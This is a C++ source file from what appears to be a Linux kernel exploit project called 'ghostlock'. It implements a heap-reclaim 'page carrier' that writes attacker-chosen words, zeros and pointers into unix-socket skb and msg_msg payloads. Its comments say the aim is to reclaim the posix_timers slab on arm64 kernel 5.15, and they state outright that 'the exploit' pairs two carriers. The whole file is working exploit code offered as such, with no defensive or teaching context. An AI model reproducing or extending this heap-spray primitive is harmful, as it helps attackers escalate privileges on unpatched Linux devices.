#include "reclaim/page_carrier.h"

#include <cstring>

namespace ghostlock::reclaim {
namespace {

/* arm64 5.15 numbers: see the max-payload constants in the header. Both carriers
 * measured so far land in a 4 KiB SLUB bucket; the target page is the 8 KiB
 * `posix_timers` slab, so one carrier covers one half of it and the exploit
 * pairs two (see the header comment). */
CarrierStatus store_word(unsigned char *page, const CarrierGeometry &geometry,
                         size_t page_offset, uintptr_t word,
                         size_t stride) noexcept {
  if (page == nullptr || !geometry_valid(geometry)) {
    return CarrierStatus::kInvalid;
  }
  if (page_offset < geometry.data_offset) {
    return CarrierStatus::kInvalid;
  }
  const size_t offset = page_offset - geometry.data_offset;
  if (offset > geometry.capacity || kWordBytes > geometry.capacity - offset) {
    return CarrierStatus::kInvalid;
  }
  if (stride != 0 && stride < kWordBytes) {
    return CarrierStatus::kInvalid;
  }
  const size_t step = stride == 0 ? geometry.capacity : stride;
  const size_t last = geometry.capacity - kWordBytes;
  for (size_t at = offset; at <= last; at += step) {
    std::memcpy(page + at, &word, kWordBytes);
    if (stride == 0) {
      break;
    }
  }
  return CarrierStatus::kOk;
}

}  // namespace

CarrierGeometry unix_skb_geometry(size_t payload_bytes) noexcept {
  const size_t max = unix_skb_max_payload();
  if (payload_bytes == 0 || payload_bytes > max) {
    return CarrierGeometry{kPageBytes, 0, 0};
  }
  return CarrierGeometry{kPageBytes, 0, payload_bytes};
}

CarrierGeometry msg_msg_geometry(size_t payload_bytes) noexcept {
  const size_t max = msg_msg_max_payload();
  if (payload_bytes == 0 || payload_bytes > max) {
    return CarrierGeometry{kPageBytes, kMsgMsgHeaderBytes, 0};
  }
  return CarrierGeometry{kPageBytes, kMsgMsgHeaderBytes, payload_bytes};
}

bool geometry_valid(const CarrierGeometry &geometry) noexcept {
  if (geometry.page_bytes == 0 || geometry.capacity == 0) {
    return false;
  }
  if (geometry.data_offset > geometry.page_bytes) {
    return false;
  }
  return geometry.capacity <= geometry.page_bytes - geometry.data_offset;
}

PageCarrier::PageCarrier(CarrierGeometry geometry) noexcept : geometry_(geometry) {}

size_t PageCarrier::window_offset(size_t page_offset) const noexcept {
  if (page_offset < geometry_.data_offset) {
    return geometry_.capacity;
  }
  const size_t offset = page_offset - geometry_.data_offset;
  return offset < geometry_.capacity ? offset : geometry_.capacity;
}

CarrierStatus PageCarrier::write_zero(size_t page_offset, size_t stride) noexcept {
  return store_word(staging_.data(), geometry_, page_offset, 0, stride);
}

CarrierStatus PageCarrier::write_pointer(size_t page_offset, uintptr_t pointer,
                                         size_t stride) noexcept {
  return store_word(staging_.data(), geometry_, page_offset, pointer, stride);
}

}  // namespace ghostlock::reclaim
